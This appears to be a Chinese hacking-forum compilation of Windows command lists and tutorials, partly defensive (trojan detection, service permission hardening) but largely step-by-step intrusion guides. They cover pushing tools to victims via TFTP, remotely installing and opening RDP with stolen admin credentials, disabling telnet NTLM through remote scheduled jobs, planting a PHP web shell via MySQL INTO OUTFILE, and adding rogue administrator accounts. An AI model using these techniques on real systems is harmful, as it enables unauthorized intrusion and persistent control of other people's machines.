　　如果你玩够了，不想再运行这个服务，可以直接禁止它在启动的时候运行，或者使用Instsrv.exe程序删除。方法是在命令行下输入“c:\instsrv.exe Mail remove”，然后回车就可以了。需要注意的是Instsrv.exe这个程序也可以删除某些系统服务，所以使用的时候一定要小心，对于系统服务，安全起见千万不要删除，哪怕你觉得它对你没有用。

【设置telnet回显】
Microsoft (R) Windows 2000 (TM) 版本 5.00 (内部版本号 2195)
欢迎使用 Microsoft Telnet Client
Telnet Client 内部版本号 5.00.99206.1

Escape 字符为 'CTRL+]'

Microsoft Telnet> set LOCAL_ECHO			//设置本地回显
Microsoft Telnet> quit



【转帖TFTP设置】
用TFTP  我就这个  方法如下

在自已的机器上面运行TFTP后，把要上传 的文件复制到和TFTP同一个目录下，在对方机器上的c：\\winnt\\system32下打入指令,其他目录下也行，
tftp -i 自已的IP get 要上传的程序

，就实现了上传程序的目的，要下载到自已的机器上的话，只要把那条语的get改成put就行
tftp -i 自已的IP put 要下载的程序


【运行--命令大全】
Windows系统:开始--运行--命令大全
Nslookup-------IP地址侦测器                           explorer-------打开资源管理器
logoff---------注销命令                               tsshutdn-------60秒倒计时关机命令
lusrmgr.msc----本机用户和组                           services.msc---本地服务设置
oobe/msoobe /a----检查XP是否激活                      notepad--------打开记事本
cleanmgr-------垃圾整理                               net start messenger----开始信使服务
compmgmt.msc---计算机管理                             net stop messenger-----停止信使服务
conf-----------启动netmeeting                         dvdplay--------DVD播放器
charmap--------启动字符映射表                         diskmgmt.msc---磁盘管理实用程序
calc-----------启动计算器                             dfrg.msc-------磁盘碎片整理程序
chkdsk.exe-----Chkdsk磁盘检查                         devmgmt.msc--- 设备管理器
regsvr32 /u *.dll----停止dll文件运行                  drwtsn32------ 系统医生
rononce -p ----15秒关机                               dxdiag---------检查DirectX信息
regedt32-------注册表编辑器                           Msconfig.exe---系统配置实用程序
rsop.msc-------组策略结果集                           mem.exe--------显示内存使用情况
regedit.exe----注册表                                 winchat--------XP自带局域网聊天
progman--------程序管理器                             winmsd---------系统信息
perfmon.msc----计算机性能监测程序                     winver---------检查Windows版本 
sfc /scannow-----扫描错误并复原
taskmgr-----任务管理器（2000／xp／2003
winver---------检查Windows版本 
wmimgmt.msc----打开windows管理体系结构(WMI) 
wupdmgr--------windows更新程序 
wscript--------windows脚本宿主设置 
write----------写字板 
winmsd---------系统信息 
wiaacmgr-------扫描仪和照相机向导 
winchat--------XP自带局域网聊天
mem.exe--------显示内存使用情况 
Msconfig.exe---系统配置实用程序 
mplayer2-------简易widnows media player 
mspaint--------画图板 
mstsc----------远程桌面连接 
mplayer2-------媒体播放机 
magnify--------放大镜实用程序 
mmc------------打开控制台 
mobsync--------同步命令
dxdiag---------检查DirectX信息 
drwtsn32------ 系统医生 
devmgmt.msc--- 设备管理器 
dfrg.msc-------磁盘碎片整理程序 
diskmgmt.msc---磁盘管理实用程序 
dcomcnfg-------打开系统组件服务 
ddeshare-------打开DDE共享设置 
dvdplay--------DVD播放器
net stop messenger-----停止信使服务 
net start messenger----开始信使服务 
notepad--------打开记事本 
nslookup-------网络管理的工具向导 
ntbackup-------系统备份和还原 
narrator-------屏幕“讲述人” 
ntmsmgr.msc----移动存储管理器 
ntmsoprq.msc---移动存储管理员操作请求 
netstat -an----(TC)命令检查接口
syncapp--------创建一个公文包 
sysedit--------系统配置编辑器 
sigverif-------文件签名验证程序 
sndrec32-------录音机 
shrpubw--------创建共享文件夹 
secpol.msc-----本地安全策略 
syskey---------系统加密，一旦加密就不能解开，保护windows xp系统的双重密码 
services.msc---本地服务设置 
Sndvol32-------音量控制程序 
sfc.exe--------系统文件检查器 
sfc /scannow---windows文件保护
tsshutdn-------60秒倒计时关机命令 
tourstart------xp简介（安装完成后出现的漫游xp程序） 
taskmgr--------任务管理器
eventvwr-------事件查看器 
eudcedit-------造字程序 
explorer-------打开资源管理器
packager-------对象包装程序 
perfmon.msc----计算机性能监测程序 
progman--------程序管理器
regedit.exe----注册表 
rsop.msc-------组策略结果集 
regedt32-------注册表编辑器 
rononce -p ----15秒关机 
regsvr32 /u *.dll----停止dll文件运行 
regsvr32 /u zipfldr.dll------取消ZIP支持
cmd.exe--------CMD命令提示符 
chkdsk.exe-----Chkdsk磁盘检查 
certmgr.msc----证书管理实用程序 
calc-----------启动计算器 
charmap--------启动字符映射表 
cliconfg-------SQL SERVER 客户端网络实用程序 
Clipbrd--------剪贴板查看器 
conf-----------启动netmeeting 
compmgmt.msc---计算机管理 
cleanmgr-------垃圾整理 
ciadv.msc------索引服务程序
osk------------打开屏幕键盘 
odbcad32-------ODBC数据源管理器 
oobe/msoobe /a----检查XP是否激活 
lusrmgr.msc----本机用户和组 
logoff---------注销命令
iexpress-------木马捆绑工具，系统自带
Nslookup-------IP地址侦测器
fsmgmt.msc-----共享文件夹管理器
utilman--------辅助工具管理器
gpedit.msc-----组策略 



【远程DOS下开3389】
用流光种植者将开后门端口的软件传到对方计算机中,一分钟后就会运行,至于后门软件大家可以到影子鹰下载中心下载不被查杀的后门.或者用OPENTELNET远程打开对方77端口,然后TELNET上对方计算机中,接着接下面方法做:

c:\>query user
c:\>echo [Components] > c:\kawen
c:\>echo TSEnable = on >> c:\kawen
//这是建立无人参与的安装参数
c:\>sysocmgr /i:c:\winnt\inf\sysoc.inf /u:c:\kawen /q
如果没有意外的话,几分钟计算机就会重启, 我们就可以利用3389的客户端连上去了



【远程屏蔽telnet服务的ntlm认证 】
不需要任何工具，远程屏蔽telnet服务的ntlm认证 
--------------------------------------------------------------------------------
 来源:不明  类别:安全文献  日期:2003-10-29 23:42:18  今日/总浏览: 9/1666   


 
很多人获得上传文件的权限和管理员权限以后想启动远程的tlelnet服务，但是却碰到
讨厌的NTLM认证，对于这种情况，我们很多时候就采用上传文件（比如NTLM.exe），然后at远程定时执行，如果手头上没有这样的工具怎么办呢？
可以这么做:
大家可以看一下win2000和nt4自带tlntadmn这个命令，他是用来控制台修改telnet设置的，很可惜这是一个控制台的交互式工具，所以at命令没有办法直接调用。
现在我们执行一下tlntadmn，然后按照以下的顺序操作
停止服务(5)->更改设置(3)->NTLM(7)->确认更改(y)->修改NTLM当前值(0)->再次确认(y)->退出菜单(0)->启动服务(4)->退出程序(0)
现在大家记住了吧，先后顺序是5(回车)3(回车)7(回车)y(回车)0(回车)y(回车)0(回车)4(回车)0(回车)
线在我们这么做
at \\ip time "echo 5 > c:\t.txt"
at \\ip time "echo 3 >> c:\t.txt"
at \\ip time "echo 7 >> c:\t.txt"
at \\ip time "echo y >> c:\t.txt"
at \\ip time "echo 0 >> c:\t.txt"
at \\ip time "echo y >> c:\t.txt"
at \\ip time "echo 0 >> c:\t.txt"
at \\ip time "echo 4 >> c:\t.txt"
at \\ip time "echo 0 >> c:\t.txt"
at \\ip time "c:\winnt\system32\tlntadmn.exe < c:\t.txt"
at \\ip time "del c:\t.txt /f"
呵呵按照上面的顺序一步一步执行
当然你本地做一个t.txt文件也可以，内容如下:
5
3
7
y
0
y
0
4
0
每个字符后面要加回车，然后copy t.txt \\ip\c$
然后再
at \\ip time "c:\winnt\system32\tlntadmn.exe < c:\t.txt"
at \\ip time "del c:\t.txt /f"
很简单的dos重定向原理，t.txt就相当于手工输入一系列的操作，完成tlntadmn的交互
呵呵

当然，你们可以在本地试验好以后再发到远程主机去
我但是劝大家练习入侵的时候尽量不要使用工具，这样对自己没有帮助的

 
小凤居 版权所有
Copyright ? 2000 - 2003 www.chinesehack.org. All Rights Reserved 

【远程开启3389终端服务】
远程开启3389终端服务
http://www.cnwill.com   
 


本文作者： 未知 文章录入：safer
文章出处： angel 
阅读次数： 326
发布日期： 2003-9-29 
远程开启3389终端服务(菜鸟篇) 
得到了一台主机的管理员权限,但我们失望的发现这台主机并没有安装3389终端服务组件, 
是不是有些懊丧呢?别急,下面我们一起来探索一下远程开启3389的方法. 

首先我们应该了解3389终端服务,可以运行在什么系统下,个人了解,终端服务在M$的大部分 
产品中都可运行,如:winnt4/win2000server/win2000ADV-server/win2000DS/XP等. 
但winnt4中是需要单独购买的,2000专业版不能远程安装终端服务的,至少我没成功过. 
我们在以下的探索中,是以win2000server和高级server为例的.(现在用的也最多). 


现在开始. 

假设我们拿到了一个主机的管理员帐户和密码. 
主机: 192.168.0.1 
帐号: administrator 
密码: 7788 
2000系统安装在c:\winnt下 


从上面的的介绍可以知道,2000专业版是不可以远程安装终端服务的,那我们就要首先来 
判断此主机是专业版还是服务器版,才能进入下一个环节. 

我们可以先用对方所开帐户判断: 

c:\>letmein \\192.168.0.1 -all -d 
stating connecting to server ... 
Server local time is: 2002-1-13 10:19:22 
Start get all users FORM server... 
-------------------------- 
Total = 5 
-------------------------- 
num0= Administrator () 
num1= Guest () 
num2= IUSR_servername (Internet 来宾帐号 ) 
num3= IWAM_servername (启动 IIS 进程帐号) 
num4= TsInternetUser (TsInternetUser) 
-------------------------- 
Total = 5 
-------------------------- 

一般情况num2/3/4这三个帐户都是2000server默认开启的. 
2000专业版默认是不开这些帐户的. 

我们也可以扫描对方开放的端口进一步确认: 
用扫描软件如:superscan3.exe扫描对方所开端口 
判断对方是否开启25,3372等2000server默认开启的端口. 

当然我们还可以使用一些工具,如:cmdinfo.zip 
这2个东东可以获得本地或远程NT/2K主机的版本,系统路径,源盘路径,PACK版本,安装时间等一 
系列信息,一个图形界面,一个命令行. 
通过返回的信息就可以很清楚的了解对方主机情况. 

还有一些其他的方法来判断,如:从对方所开的服务来确定等, 
从上面的判断准确率还算高,别的就不一一说明了. 


如果你在以上步骤里发现对方主机并没有那3个帐户,默认端口也没开, 
或cmdinfo返回的信息对方是2000专业版,你就要放弃安装3389的计划了. 


现在我们要进入下一环节: 
判断终端服务到底有没有安装? 

你也许要问:为什么还要判断啊?我扫描没有发现3389端口啊? 
这里就需要解释一下,如果装了终端服务组件,可能有哪几种情况扫描不到3389端口? 
1.终端服务termservice在"管理工具">>>"服务"中被禁用. 
2.终端服务连接所需的RDP协议在"管理工具">>>"终端服务配置"中被停用连接. 
3.终端服务默认连接端口3389被人为的改变.如何改变请看修改终端服务默认的3389端口(图文) 
4.终端服务绑定的网络适配器不是外网的. 
5.防火墙和端口过滤之类的问题. 
6.....(还有我没想到的) 
其实,我们遇到最多的情况就是以上5种情况. 

现在开始判组件是否被安装. 

先与远程主机连接,映射远程主机C盘为本地Z盘 
net use z: \\192.168.0.1\c$ "7788" /user:"administrator" 
命令成功完成。 

然后转到Z盘,检查 
Z:\Documents and Settings\All Users\「开始」菜单\程序\管理工具> 
里是否有 "终端服务管理器"和"终端服务配置"的快捷方式文件 
如有已安装服务组件的会有,反之,没有(98% 人为故意删的可能性较小) 
我们还可以在下一步telnet到对方主机后使用终端服务自带的命令进一步的核实. 

判断完毕,对方好像是没有安装终端服务组件,可以进入下一步: 
telnet登陆对方主机,准备安装服务组件. 

在这里,我强烈建议使用2000自带的telnet服务端登陆, 
有回显,不容易出错.个人感觉使用它,一次成功的比例高很多.(呵呵~,个人理解啊!) 
就算没有开,打开用完后再关掉就完了. 
.abu.写的最快速登录WIN2K TELNET 服务已经把这个方法介绍的非常详细, 
而且他的办法(在本机建立同名,同密码帐户),让快速实现telnet登陆成为现实. 

假如我们已开启对方23端口, 
telnet 192.168.0.1 
输入用户名/密码 
*=============================================================== 
欢迎使用 Microsoft Telnet 服务器。 
*=============================================================== 
C:\> 
\\成功进入!!!! 

进入后,再次检查终端组件是否安装: 
c:\>query user 
这个工具需要安装终端服务. 

这样就进一步确定了组件没有被安装.如果返回: 
USERNAME SESSIONNAME ID STATE IDLE TIME LOGON TIME 
>w1 console 0 运行中 . 2002-1-12 22:5 
\\类似这样的信息,可能组件就已安装. 

好!都清楚了,可以开始安装了. 
--------------------------------------------------- 
C:\>dir c:\sysoc.inf /s //检查INF文件的位置 
c:\WINNT\inf 的目录 

2000-01-10 20:00 3,770 sysoc.inf 
1 个文件 3,770 字节 
----------------------------------------------------- 
C:\> dir c:\sysocmgr.* /s //检查组件安装程序 
c:\WINNT\system32 的目录 

2000-01-10 20:00 42,768 sysocmgr.exe 
1 个文件 42,768 字节 
----------------------------------------------------- 
c:\>echo [Components] > c:\wawa 
c:\>echo TSEnable = on >> c:\wawa 
//这是建立无人参与的安装参数 
c:\>type c:\wawa 
[Components] 
TSEnable = on 
//检查参数文件 
------------------------------------------------------ 
c:\>sysocmgr /i:c:\winnt\inf\sysoc.inf /u:c:\wawa /q 
----------------------------------------------------- 
这一条就是真正安装组件的命令. 
以上这条命令没有加/R参数,主机在安装完后自动重起. 
如若加了/R参数主机就不会重起. 

如果一切正常的话,几分钟后对方主机将会离线,当它重新回来时, 
3389终端服务就已经开启.你就可以连上去了. 

问题和建议: 

A 在安装过程中,不使用/R,有时主机也不会重起,你就要手动重起他,但在使用诸如:iisreset /reboot命令时,对方 
的屏幕会出现个对话框,写着谁引起的这次启动,离重起还有多少秒. 

B 一次不行可以再试一次,在实际中很有作用. 

C 在输入sysocmgr命令开始安装时,一定不要把命令参数输错,那会在对方出现一个大的对话框,是sysocmgr的帮助,很是显眼, 
而且要求确定.在你的屏幕上是不会有任何反应的,你不会知道出错，所以会有B的建议.
 


【通过mysql入侵NT和win2000】
通过mysql入侵NT和win2000 
   浏览选项： 大中小  颜色 默认 灰度 橄榄色 绿色 蓝色 褐色 红色    
 
   
  
 许多NT和win2000机器上面装有mysql和php。而mysql默认数据库root账号为空，这就给入侵者一个途径来入侵该机器。如果修改了数据库root的账号密码，而IIS的一些其他漏洞导致源代码泄漏也可能看到数据库的账号和密码。假设我们已经拿到了数据库的密码，看看我们如何通过mysql数据库来获得该机器的一定权限。 
首先通常情况下，一般mysql和php配合使用，大多数NT和win2000的机器上如果使用php一般都会使用mysql。而默认情况下windows上的mysql是允许远程连接的。而装在linux等上的mysql是不允许远程连接的。入侵的思路是写一个shell脚本到web目录。就可以通过这个shell教本来执行命令了。而一般情况下，windows的web服务器是IIS,默认也是支持asp脚本的。网上也随处可见asp的sehll脚本,只要将这个asp的脚本传到web目录就好了。但是我觉得那些脚本都比较麻烦。而如果目标机器上面有php的话就可以用php脚本了。在这里我用php脚本来写shell。首先我们要用mysql的客户端连结到该机器,并执行我们的sql语句来在web目录生成php的shell脚本。 
C:mysqlin>mysql -h xxx.xxx.xxx.xxx -uroot <php.sql 

C:mysqlin> 

下面是php.sql的内容： 
use test; 
create table tmp(cmd TEXT); 
insert into tmp values('<body onload=document.form1.cmd.focus()><?if (isset($cmd)){$cmd=stripslashes($cmd);exec("$cmd > temp.dat");}?><style type="text/css"><!-- .form1 {BACKGROUND: #FFFFFF; BORDER-BOTTOM: #666666 1px solid; BORDER-LEFT: #666666 1px solid; BORDER-RIGHT: #666666 1px solid; BORDER-TOP: #666666 1px solid; COLOR: #3c464f; FONT-SIZE: 9pt; clip: rect( ); cursor: text; height: auto; width: auto; margin-top: 0px; margin-right: 0px; margin-bottom: 0px; margin-left: 0px--></style><p class="title2"> </p><form name="form1" method=\"post" action="/cmd2.php"> <input type="text" name="cmd" size="50" class="form1"></form><form name="form2" method="post" action=""> <p> <textarea name="text" cols="120" rows="50" class="form1"><?if(isset($cmd)){readfile("temp.dat");unlink("temp.dat");}?></textarea> </p></form></body>'); 
select * from tmp into outfile 'd:\new\cmd2.php'; 
drop table tmp; 

上面的sql语句是创建一个名字为tmp的table,将脚本输入到数据库，然后再将这个脚本保存成d: ewcmd2.php。然后删除tmp这个我们创建的table。这里的d: ew的目录是该机器的web目录。然后我们就可以在浏览器中输http://xxx.xxx.xxx.xxx/cmd2.php，就可以利用这个shell执行命令了。至此我们已经获得了该网站的一个guest权限的shell了。我们可以通过这个shell脚本写个ftp脚本来上传文件，也可以利用这个shell来进行其他guest权限能够执行的一些东东了。这里需要注意的是如果cmd2.php已经存在了这个sql脚本是不能运行成功的。这个php脚本不能写成功。 
关键的问题在于获得数据库的密码并且能够找到web目录。然后一切都不成问题了。 
安全建议：设置mysql数据库的密码，并且要有一定的强度。设置好IIS避免泄漏源代码，不要直接在web目录编辑脚本等文件，因为有些编辑器会自动产生一个备份文件，一般为.bak的扩展名，这样恶意攻击者就可能直接打开这个.bak文件从而泄漏源代码，比如global.asa.bak。 
 
 


【防范三绝技-谈木马“查、堵、杀”】
防范三绝技-谈木马“查、堵、杀” 

编者按：
木马程序是一种程序，它能提供一些有用的，或是仅仅令人感兴趣的功能。但是它还有用户所不知道的其他功能，例如在你不了解的情况下拷贝文件或窃取你的密码。

RFC1244(Request for Comments:1244)中是这样描述木马的：“木马程序是一种程序，它能提供一些有用的，或是仅仅令人感兴趣的功能。但是它还有用户所不知道的其他功能，例如在你不了解的情况下拷贝文件或窃取你的密码。”随着互联网的迅速发展，木马的攻击、危害性越来越大。木马实质上是一个程序，必须运行后才能工作，所以会在进程表、注册表中留下蛛丝马迹，我们可以通过“查、堵、杀”将它“缉拿归案”。

查

1.检查系统进程

大部分木马运行后会显示在进程管理器中，所以对系统进程列表进行分析和过滤，可以发现可疑程序。特别是利用与正常进程的CPU资源占用率和句柄数的比较，发现异常现象。

2.检查注册表、ini文件和服务

木马为了能够在开机后自动运行，往往在注册表如下选项中添加注册表项：

HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼Run

HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce

HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnceEx

HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunServices

HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunServicesOnce

木马亦可在Win.ini和System.ini的“run=”、“load=”、“shell=”后面加载，如果在这些选项后面加载程序是你不认识的，就有可能是木马。木马最惯用的伎俩就是把“Explorer”变成自己的程序名，只需稍稍改“Explorer”的字母“l”改为数字“1”，或者把其中的“o”改为数字“0”，这些改变如果不仔细观察是很难被发现。

在Windwos NT/2000中，木马会将自己作为服务添加到系统中，甚至随机替换系统没有启动的服务程序来实现自动加载，检测时要对操作系统的常规服务有所了解。

3.检查开放端口

远程控制型木马以及输出Shell型的木马，大都会在系统中监听某个端口，接收从控制端发来的命令，并执行。通过检查系统上开启的一些“奇怪”的端口，从而发现木马的踪迹。在命令行中输入Netstat na，可以清楚地看到系统打开的端口和连接。也可从www.foundstone.com下载Fport软件，运行该软件后，可以知道打开端口的进程名，进程号和程序的路径，这样为查找“木马”提供了方便之门。

4.监视网络通讯

对于一些利用ICMP数据通讯的木马，被控端没有打开任何监听端口，无需反向连接，不会建立连接，采用第三种方法检查开放端口的方法就行不通。可以关闭所有网络行为的进程，然后打开Sniffer软件进行监听，如此时仍有大量的数据，则基本可以确定后台正运行着木马。

堵

1.堵住控制通路

如果你的网络连接处于禁用状态后或取消拨号连接，反复启动、打开窗口等不正常现象消失，那么可以判断你的电脑中了木马。通过禁用网络连接或拔掉网线，就可以完全避免远端计算机通过网络对你的控制。当然，亦可以通过防火墙关闭或过滤UDP、TCP、ICMP端口。

2.杀掉可疑进程

如通过Pslist查看可疑进程，用Pskill杀掉可疑进程后，如果计算机正常，说明这个可疑进程通过网络被远端控制，从而使计算机不正常。

杀

1.手工删除

对于一些可疑文件，不能立即删除，有可能由于误删系统文件而使计算机不能正常工作。首先备份可疑文件和注册表，接着用Ultraedit32编辑器查看文件首部信息，通过可疑文件里面的明文字符对木马有一个大致了解。当然高手们还可以通过W32Dasm等专用反编译软件对可疑文件进行静态分析，查看文件的导入函数列表和数据段部分，初步了解程序的主要功能。最后，删除木马文件及注册表中的键值。

2.软件杀毒

由于木马编写技术的不断进步，很多木马有了自我保护机制。普通用户最好通过专业的杀毒软件如瑞星、金山毒霸等软件进行杀毒，对于杀毒软件，一定要及时更新，并通过病毒公告及时了解新木马的预防和查杀绝技，或者通过下载专用的杀毒软件进行杀毒(如近期的冲击波病毒各大公司都开发了查杀工具)。



【限制服务的权限】
2000下面的服务默认是Everyone完全控制的，这就造成了2000下面的安全隐患，记得某款清除日志的软件就是靠停掉IIS服务来达到删除日志记录的目的吧；另外如果服务器的服务不限制权限的话万一你的服务器有什么漏洞，就算对方没有拿到管理员的权限…想必大家也都清楚意味着什么了吧。 

方法一:使用组策略 
1、管理工具－Active Directory用户和计算机 
2、右键点击域－创建新的组织单位 
3、右键点击新建的组织单位选择属性 
4、选择组策略 
5、创建新的组策略，进行编辑 
6、计算机配置－Windows设置－安全设置－系统服务 
7、双击你需要设置权限的服务 
8、定义这个策略是个设置－编辑安全设置（默认是Everyone完全控制） 
9、删除Everyone组，添加System组和其他有访问权限的用户。 
10、分配给用户和组读取、启动、停止和暂停的权限。 
11、把服务的启动模式改为自动。 
12、把你所需要限制服务的计算机添加到你所创建的组织单位里面，完成！ 

注：如果发现设置错误的话，可以通过Regedt32编辑 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\<ServiceId>\Security，删除Security键，重新启动。 

方法二：使用Subinacl 
Subinacl为2000ResourceKit里面提供的工具，具体语法如下。 
SUBINACL /SERVICE \\ComputerName\ServiceName /GRANT=[DomainName\]UserName[=Access] 
这其中： 
ComputerName - 机器的NetBIOS名，省略的话代表本地 
ServiceName - 服务的名称 
DomainName - 域名，省略的话搜索本地的用户 
UserName - 要被赋予权限的用户名称 
Access - F : 完全控制 (缺省) 
R : 读 
W : 写 
X : 执行 
L : 读取控制 
Q : 查询服务的设置 
S : 查询服务的状态 
E : 列出所依赖的服务 
C : 改变服务的设置 
T : 启动服务 
O : 停止服务 
P : 暂停／开始 服务 
I : 询问服务 
U : 用户用命令行方式定义服务控制 

如果本机的话就容易多了，比如想限定本机的DNS服务的权限是Administrator完全控制的话执行 
subinacl /service \dns /grant=administrator=f就OK了。 


方法三：使用脚本 

提供了一个例子，根据自己的实际情况可以对下面的脚本进行修改。 

jsiDomain= Wscript.Arguments.Item(0)'domain of computer account 
jsiComputer = Wscript.Arguments.Item(1)'netbios ComputerName 
jsiUserName = Wscript.Arguments.Item(2)'UserName (in the domain) 
jsiPerm= Wscript.Arguments.Item(3)'access code 
'bind to ComputerName 
set objTarget = GetObject("WinNT://" & jsiDomain & "/" & jsiComputer & ",computer") 
'create a shell object for call to subinacl 
set objCMD = CreateObject("Wscript.Shell") 
'get list of services 
objTarget.filter = Array("Service") 
For each Service in objTarget 
command = "subinacl /service " & Service.name & " /grant=" & jsiUserName & "=" & jsiPerm 
objCMD.Run command, 0 
'report the services 
Wscript.Echo "User granted access to " & Service.name & " " 
next 
NOTE: This script does NOT perform any error checking. 


【隐藏文件夹下的内容】
隐藏文件夹下的内容

如果想隐藏你的文件夹，通过将文件夹的属性设置为“隐藏”是没有用的。只需在文件夹的“查看”菜单中，选择“文件夹选项”单击“查看”选项卡，选择“显示所有的文件和文件夹”项，就可显示出所有具有隐藏属性的文件夹和文件。可以利用类标识符作为文件夹名的文件扩展名。例如我们想保护文件夹c:＼mydata。首先在注册表项HKEY＿CLASSES＿ROOT下找到该文件类型的CLSID，将c:＼mydata的名称修改为“c:＼mydata. {00022603-0000-0000-C000-000000000046}”。此时c:＼mydata的图标就变成了MIDI文件的图标。在资源管理器中双击该图标，系统会报告该MIDI文件内容错误，无法播放(系统将文件夹当做MIDI文件处理了)，因此用户无法进入c:＼mydata，也就无法查看该文件夹下的内容。唯一能够查看文件夹内容的方法是：在命令解释器窗口中，使用CD命令进入到该文件夹。



【黑客入侵中最常用的网络命令】
*net user 查看用户列表
*net user 用户名 密码 /add 添加用户
*net user 用户名 密码 更改用户密码
*net localgroup administrators 用户名 /add 添加用户到管理组
*net user 用户名 /delete 删除用户
*net user 用户名 查看用户的基本情况
*net user 用户名 /active:no 禁用该用户
*net user 用户名 /active:yes 启用该用户

*net share 查看计算机IPC$共享资源
*net share 共享名 查看该共享的情况
*net share 共享名=路径 设置共享。例如 net share c$=c:
*net share 共享名 /delete 删除IPC$共享

*net use 查看IPC$连接情况
*net use \\ip\ipc$ "密码" /user:"用户名" ipc$连接

*net time \\ip 查看远程计算机上的时间

*copy 路径:\文件名 \\ip\共享名 复制文件到已经ipc$连接的计算机上

*net view ip 查看计算机上的共享资源

*ftp 服务器地址 进入FTP服务器

*at 查看自己计算机上的计划作业
*at \\ip 查看远程计算机上的计划作业
*at \\ip 时间 命令(注意加盘符) 在远程计算机上加一个作业
*at \\ip 计划作业ID /delete 删除远程计算机上的一个计划作业
*at \\ip all /delete 删除远程计算机上的全部计划作业





【黑客技术】


第1页 

基本技能...............................................................................2楼
黑客初级技术讲解（上）..........................................................3楼
黑客初级技术讲解（中）..........................................................4楼
黑客初级技术讲解（下）..........................................................5楼
基础知识（1）.......................................................................6楼
基础知识（2）.......................................................................7楼
基础知识（3）.......................................................................8楼
基础知识（4）.......................................................................9楼
基础知识（5）.....................................................................10楼
基础知识（6）.....................................................................11楼
初级技术.............................................................................12楼
黑客兵器之木马篇（上）........................................................13楼
黑客兵器之木马篇（下）........................................................14楼
黑客兵器之扫描篇（上）........................................................15楼 

第2页 

黑客兵器之扫描篇（下）........................................................16楼
代理、肉鸡、跳板的概念........................................................17楼
网络监听概念.......................................................................18楼
系统进程信息.......................................................................19楼
端口全解析（上）.................................................................20楼
端口全解析（下）.................................................................21楼
端口详细说明表（上）...........................................................22楼
端口详细说明表（下）...........................................................23楼
菜鸟进阶（1）.....................................................................24楼
...........................
菜鸟进阶（7）.....................................................................30楼 

第3页 

菜鸟进阶（8）.....................................................................31楼
菜鸟进阶（9）.....................................................................32楼
1-32楼教程下载....................................................................33楼
木马防范及一些端口的关闭（上）............................................34楼
木马防范及一些端口的关闭（下）............................................35楼
黑客窃取密码及防范..............................................................36楼
SSL.TLS.WTLS原理（上）.....................................................37楼
SSL.TLS.WTLS原理（下）.....................................................38楼
关于MAC地址和IP地址的知识..................................................39楼
术语表（1）........................................................................40楼
.........................
术语表（4）........................................................................44楼
34楼-44楼内容下载...............................................................45楼 

第4页
个人电脑安全.......................................................................46楼
网络安全知识（1）...............................................................47楼
........................
网络安全知识（7）...............................................................53楼
防范非系统用户破坏..............................................................54楼
44-54楼内容下载..................................................................55楼
黑客扫描特征及易受攻击端口..................................................56楼
开始..运行..命令集合.............................................................57楼
PING命令及使用技巧.............................................................58楼
GHOST详细解说（1）...........................................................59楼
GHOST详细解说（2）...........................................................60楼 

第5页 

GHOST详细解说（3）...........................................................61楼
56楼到61楼内容下载.............................................................62楼
ipc$详细解说大全（1）..........................................................63楼
..............................
ipc$详细解说大全（5）..........................................................67楼
I P C $ 入 侵图文结合............................................................68楼
常见ASP脚本攻击及防范技巧...................................................69楼
37秒迅速破解网吧.................................................................70楼
开启3389的5种方法（上）......................................................71楼
开启3389的5种方法（下）......................................................71楼
网络常见攻击及防范手册（上）................................................73楼
网络常见攻击及防范手册（下）................................................74楼
DOS攻击原理及方法介绍.........................................................75楼 

第6页 

如何突破各种防火墙..............................................................76楼
蠕虫技术（上）....................................................................77楼
蠕虫技术（中）....................................................................78楼
蠕虫技术（下）....................................................................79楼
壳（上）.............................................................................80楼
壳（下）.............................................................................81楼
简单黑客工具使用.................................................................82楼
浅谈绑定之应用....................................................................83楼
永远的后门..........................................................................84楼
入门者如何获得肉鸡..............................................................85楼
流光的使用方法....................................................................86楼
玩木马................................................................................87楼
溢出专集.............................................................................88楼
NET START可以起用命令一览表（上）.....................................89楼
NET START可以起用命令一览表（下）.....................................90楼 

第7页 

PHP注入实例........................................................................91楼
SQL注入新技巧.....................................................................92楼
76楼到92楼内容下载..............................................................93楼 






--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:36am 

一个黑客的基本技能 

１、黑客的精神态度是很重要的，但技术则更是重要。黑客的态度虽然是无可取代，随著新科技的发明和旧技术的取代,这些工具随时间在慢慢的改变。例如:以往总是会学会用机器码写程序，直到最近我们开始使用HTML。不过，在1996年末,当然，这是基础的hacking技能。在1997年，理所当然的，你必须学会C。 但,如果你只是学一种语言，那么你不能算是一位黑客，了不起只能算是一个programmer。除此,你还必须学会学会以独立于任何程序语言之上的概括性观念来思考一件程序设计上的问题。要成为一位真正的黑客，你必须要能在几天之内将manual内容和你目前己经知道的关连起学会一种新的语言。也就是说，你必会学还了C之外的东西，你至少还要会LISP或Perl(Java也正在努力的挤上这个名单; 译者注: 我很怀疑这份名单)。除了几个重要的hacking常用语言之外，这些语言提供你一些不同的程序设计途径，并且让你在好的方法中学习。 

程序设计是一种复杂的技术，我没辨法在这提供完整的学习步骤。但是我能告诉你一些在书本上和课堂上所没有的东西(有很多，几乎全部最好的黑客们都是自习而来的)。(a) 读别人的程序码；(写程序，这两项是不错的方法。学习写程序就像在学习写一种良好的自然语言，最好的方法是去看一些专家们所写的东西，然后写一些你自己的东西，然后读更多，再写更多。然后一直持续，一直到你发展出一种属于自己的风格和特色。要找到好的程序码来看是很一件很困难的事，因为，对菜鸟黑客们而言，适于供他们阅读和努力的大型程序的source数量很少。但这事己有了戏剧性的变化了; 现在免费的供应的软件、程序设计工具和操作系统(大都公开提供 source，而且全都是由黑客们写成的)到处可看。进入下一个主题。 

２、取得一个免费的 UNIX，并学习使用和维护。我先假设你己经有一部个人电脑或者是可以使用任何一部(现在的小孩子真幸福，可如此轻易的拥有 :-))。 取得黑客技巧的第一个步骤是取得一份Linux 或者一份免费的 BSD-Unix，并将它安装在自己的机器，并使之顺利的运作。没错，在这个世界上除了Unix之外，还有其它的操作系统。但是他们只提供bianry，你不能看到他们的程序码，你也不能修改他们。想要在DOS或Windows或MacOS开始hacking，无疑就是要你绑著枷锁跳舞一样。 

